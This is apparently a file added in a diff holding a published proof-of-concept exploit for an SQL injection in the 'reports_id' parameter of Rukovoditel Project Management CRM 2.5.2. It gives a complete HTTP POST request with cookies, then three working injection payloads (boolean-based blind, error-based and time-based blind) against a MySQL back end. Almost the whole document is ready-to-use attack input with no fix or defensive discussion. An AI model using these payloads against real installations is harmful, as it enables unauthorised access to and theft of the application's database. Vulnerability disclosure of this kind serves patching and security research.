@@ -1,0 +1,45 @@
+# Exploit Title: Rukovoditel Project Management CRM 2.5.2 - 'reports_id' SQL Injection
+# Google Dork: N/A
+# Date: 2020-01-15
+# Blog: https://fatihhcelik.blogspot.com/
+# Exploit Author: Fatih Çelik
+# Vendor Homepage: https://www.rukovoditel.net/
+# Software Link: https://sourceforge.net/projects/rukovoditel/
+# Version: 2.5.2
+# Tested on: Kali Linux
+# CVE : N/A
+
+# Request,
+
+POST /ruko/index.php?module=items/listing HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/ruko/index.php?module=reports/view&reports_id=68%27
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 330
+Connection: close
+Cookie: cookie_test=please_accept_for_session; sid=3jnq6vg6ovl2cq0ojpsff4vaol; hblid=9P5zBGVwXwPEgj9L3m39N0U0I0A6O221; olfsk=olfsk14190220759411198; xoadmstyle=silver
+
+redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1
+
+# PAYLOADS,
+
+# Parameter: reports_id (POST)
+# Type: boolean-based blind
+# Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+
+Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' RLIKE (SELECT (CASE WHEN (9654=9654) THEN 68 ELSE 0x28 END))-- AlKt&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1
+
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+
+Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' AND (SELECT 8112 FROM(SELECT COUNT(*),CONCAT(0x716b706a71,(SELECT (ELT(8112=8112,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rVyr&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1
+
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' AND (SELECT 4324 FROM (SELECT(SLEEP(5)))KySi)-- Pfwf&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1
